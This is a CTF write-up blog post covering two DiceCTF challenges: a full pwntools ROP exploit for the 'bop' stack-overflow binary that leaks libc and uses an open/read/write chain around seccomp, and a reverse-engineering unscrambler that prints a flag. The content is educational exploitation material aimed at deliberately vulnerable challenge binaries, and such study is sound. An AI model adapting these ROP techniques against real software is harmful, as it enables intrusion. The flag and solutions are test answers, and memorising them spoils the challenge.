---
title: DiceCTF 2023 and DiceCTF Quals 2024
category: WRITEUP, CTF, SECCOMP, RE, PWN
date: May 15th, 2024
description: Writeup of a few challenges from DiceCTF 2023.
---

## BOP
The vulnerability in this binary is very simple, a simple gets in main. There
are a few main things to note. 

1. We can only call open, read, and write syscalls due to seccomp being enabled
2. There is only a pop rdi gadget

#### Getting the Leak
To get a leak, we can do a ret2puts with our pop rdi gadget, and printf.
It works the exact same although it is more prone to a movaps stack alignment
error than puts.

We also weren't given a libc so we need to leak it from remote. We can 
do this by leaking multiple symbols and looking it up in the libc databasse.

#### ORW Rop Chain


```python
#!/usr/bin/python
from pwn import *

context.update(
        arch="amd64",
        endian="little",
        log_level="info",
        os="linux",
        terminal=["st"]
)

def start(binary):
    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *0x4012f9
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("mc.ax",30284)
    else:
        return process(binary)


def leak_libc(p,e,r,l):

    pad = b"A" * 40

    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    printf_got = p64(e.got["printf"])
    printf_plt = p64(e.plt["printf"])
    main = p64(0x4012f9)

    got_funcs = [p64(e.got["printf"]), p64(e.got["gets"]), p64(e.got["setbuf"])]

    chain = ret + pop_rdi + got_funcs[0] + printf_plt
    chain += ret + main

    p.recvuntil(b"bop? ")
    p.sendline(pad + chain)
    leak = u64(p.recvuntil(b"Do").split(b"Do")[0] + b"\x00\x00")
    log.info(f"printf leak: {hex(leak)}")

    print(hex(l.sym["printf"]))
    libc_base = leak - l.sym["printf"]
    log.info(f"Leaked Libc Base: {hex(libc_base)}")
    return libc_base

def read_file(p,e,r,l,base):
    lr = ROP(l)

    pad = b"A" * 40

    main = p64(0x4012f9)
    writable_mem = p64(0x404100)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    pop_rdx = p64(lr.find_gadget(["pop rdx", "pop rbx", "ret"])[0] + base)
    read = p64(l.sym["read"] + base)
    log.info(f"Pop rdi: {hex(u64(pop_rdi))}")
    log.info(f"Pop rsi: {hex(u64(pop_rsi))}")
    log.info(f"Pop rdx: {hex(u64(pop_rdx))}")
    log.info(f"read: {hex(u64(read))}")

    log.info(f"Reading in /srv/app/flag.txt")

    chain = pop_rdi + p64(0)
    chain += pop_rsi + writable_mem + p64(0)
    chain += pop_rdx + p64(18) + p64(0)
    chain += read + main
    chain += ret + main


    p.recvuntil(b"bop?")
    p.sendline(pad + chain)
    pause()
    p.sendline(b"flag.txt\x00")

def open_flag(p,e,r,l,base):
    lr = ROP(l)
    pad = b"A" * 40

    writable_mem = p64(0x404100)
    main = p64(0x4012f9)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    syscall = p64(lr.find_gadget(["syscall", "ret"])[0] + base)
    pop_rax = p64(lr.find_gadget(["pop rax", "ret"])[0] + base)


    chain = pop_rdi + writable_mem
    chain += pop_rsi + p64(0x000) + p64(0)
    chain += pop_rax + p64(2)
    chain += syscall + ret + main

    log.info(f"Opening /srv/app/flag.txt")

    p.recvuntil(b"bop?")
    p.sendline(pad + chain)

def read_flag(p,e,r,l,base):
    lr = ROP(l)

    pad = b"A" * 40

    main = p64(0x4012f9)
    writable_mem = p64(0x404100)
    pop_rdi = p64(r.find_gadget(["pop rdi", "ret"])[0])
    ret = p64(u64(pop_rdi) + 1)
    pop_rsi = p64(r.find_gadget(["pop rsi",  "pop r15", "ret"])[0])
    pop_rdx = p64(lr.find_gadget(["pop rdx", "pop rbx", "ret"])[0] + base)
    printf = p64(e.plt["printf"])
    read = p64(l.sym["read"] + base)
    log.info(f"Pop rdi: {hex(u64(pop_rdi))}")
    log.info(f"Pop rsi: {hex(u64(pop_rsi))}")
    log.info(f"Pop rdx: {hex(u64(pop_rdx))}")
    log.info(f"read: {hex(u64(read))}")

    log.info(f"Reading in flag")

    chain = pop_rdi + p64(3)
    chain += pop_rsi + writable_mem + p64(0)
    chain += pop_rdx + p64(0x60) + p64(0)
    chain += read
    chain += pop_rdi + writable_mem
    chain += printf

    p.recvuntil(b"bop?")
    p.sendline(pad + chain)
    p.interactive()



if __name__=="__main__":
    file = './bop'

    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    if args.REMOTE:
        libc = ELF("./libc.so.6")
    else:
        libc = e.libc

    base = leak_libc(p,e,r, libc)
    read_file(p,e,r,libc,base)
    open_flag(p,e,r,libc,base)
    read_flag(p,e,r,libc,base)


```



## Parallelism


### Static Analysis
When we take a look at the binary we can see that there is a string that is
64 characters long and contains the characters "d", "i", "c", "e", "{", "}". 
This can tell us that it is a flag scrambler.

### Patching the Binary
When we look at the binary, we can see that there is a function call that will
take in the scrambled input. We can patch this to print out the scrambled input
to determine the order of scrambling. If we patch it with puts it will print the
scrambled input. We can send a string of the alphabet and get the order

### Unscrambling the Flag
We can make a simple script that will reverse the scrambling on the encrypted flag
```
alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-+"
test = "51sZIpMhSrd7HBUgRmCQPy23vu6joc-LEXT9KzbaOxefAtY8l+kJ0GNw4WnqFiDV"
enc_flag = "m_ERpmfrNkekU4_4asI_Tra1e_4l_c4_GCDlryidS3{Ptsu9i}13Es4V73M4_ans"
order = []

for a in alp:
    order.append(test.index(a))
flag = ""
for o in order:
    flag += enc_flag[o]

print(order)
print(flag)

```

Running the script gets us the flag
```
python solve_par.py
[39, 38, 29, 10, 42, 43, 15, 7, 61, 27, 50, 48, 17, 58, 28, 5, 59, 9, 2, 45, 25, 24, 55, 41, 21, 37, 44, 13, 18, 62, 32, 60, 53, 12, 4, 51, 36, 31, 6, 54, 40, 20, 19, 16, 8, 34, 14, 63, 57, 33, 46, 3, 52, 1, 22, 23, 56, 0, 26, 11, 47, 35, 30, 49]
dice{P4ral1isM_m4kEs_eV3ryt4InG_sUp3r_f4ST_aND_s3CuRE_a17m4k9l4}
```



## 
